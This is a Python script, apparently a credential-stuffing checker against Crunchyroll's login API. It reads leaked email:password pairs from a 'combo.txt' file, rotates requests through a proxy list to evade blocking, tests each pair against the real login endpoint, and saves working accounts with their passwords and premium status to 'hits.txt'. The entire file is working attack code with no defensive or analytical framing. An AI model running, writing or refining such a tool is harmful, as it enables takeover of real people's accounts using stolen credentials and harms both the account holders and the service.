import requests
import uuid  # Import the uuid module for generating GUIDs

# Function to generate a GUID
def generate_guid():
    return str(uuid.uuid4())  # Generate a random UUID and convert it to a string

# Function to read proxies from a file
def read_proxies(file_path):
    proxies = []
    with open(file_path, "r") as file:
        for line in file:
            proxy = line.strip()
            proxies.append(proxy)
    return proxies

# Rest of the code remains the same...

# Function to split email and password from the format "email:password"
def extract_email_password(credentials):
    email, password = credentials.split(":")
    return email, password

# Generate a GUID (ID)
ID = generate_guid()

# URL for the session start request
session_start_url = "https://api.crunchyroll.com/start_session.0.json"

# Data for the session start request
session_start_data = {
    "device_type": "com.crunchyroll.windows.desktop",
    "device_id": ID,
    "access_token": "LNDJgOit5yaRIWN"
}

# Headers for the session start request
session_start_headers = {
    "Accept-Encoding": "gzip, deflate",
    "Host": "api.crunchyroll.com",
    "Connection": "Keep-Alive",
    "Cache-Control": "no-cache"
}

# Load proxies from proxy.txt
proxies_list = read_proxies("proxy.txt")

# Loop through the proxies and make requests using each one
for proxy in proxies_list:
    # Create a session with the current proxy
    session = requests.Session()
    session.proxies = {"http": proxy, "https": proxy}

    # Send the session start request with the proxy
    session_start_response = session.post(session_start_url, data=session_start_data, headers=session_start_headers)

    # Check if the session start request was successful
    if session_start_response.status_code == 200:
        # Parse the response to extract the session_id (tk)
        response_data = session_start_response.json()
        tk = response_data.get("data", {}).get("session_id")
        print(f"Session ID (tk) with Proxy {proxy}: {tk}")  # Print the session_id (tk) in the terminal

        # Initialize an empty list to store email:password pairs
        email_password_list = []

        # Read email:password pairs from the file combo.txt
        with open("combo.txt", "r") as combo_file:
            for line in combo_file:
                line = line.strip()  # Remove leading/trailing whitespace and newlines
                if line:
                    email_password_list.append(line)

        # Initialize an empty list to store successful logins
        successful_logins = []

        # Loop through the list and perform login for each pair
        for credentials in email_password_list:
            # Split email and password
            email, password = extract_email_password(credentials)

            # URL for the login request
            login_url = "https://api.crunchyroll.com/login.0.json"

            # Data for the login request
            login_data = {
                "account": email,
                "password": password,
                "session_id": tk,
                "locale": "enUS",
                "version": "1.3.1.0",
                "connectivity_type": ""
            }

            # Headers for the login request
            login_headers = {
                "Accept-Encoding": "gzip, deflate",
                "Host": "api.crunchyroll.com",
                "Connection": "Keep-Alive",
                "Cache-Control": "no-cache"
            }

            # Send the login request with the proxy
            login_response = session.post(login_url, data=login_data, headers=login_headers)

            # Print the response of the login request
            print(f"Login Response for {email} with Proxy {proxy}:")
            print(login_response.text)

            # Check the response for success or failure
            if login_response.status_code == 200:
                response_data = login_response.json()
                if response_data.get("error") is False:
                    # Login success, extract premium information if needed
                    premium_info = response_data.get("premium")
                    login_info = f"Login successful for Email: {email}, Password: {password}. Premium Info: {premium_info}"
                    successful_logins.append(login_info)
                else:
                    print(f"Login failed for {email}.")
            else:
                print(f"Login request failed for {email}.")

        # Save successful logins to hits.txt
        with open("hits.txt", "a") as hits_file:
            for login in successful_logins:
                hits_file.write(login + "\n")

        print(f"All login attempts completed with proxy {proxy}.") 
    else: print(f"Session start request failed with Proxy {proxy}.")
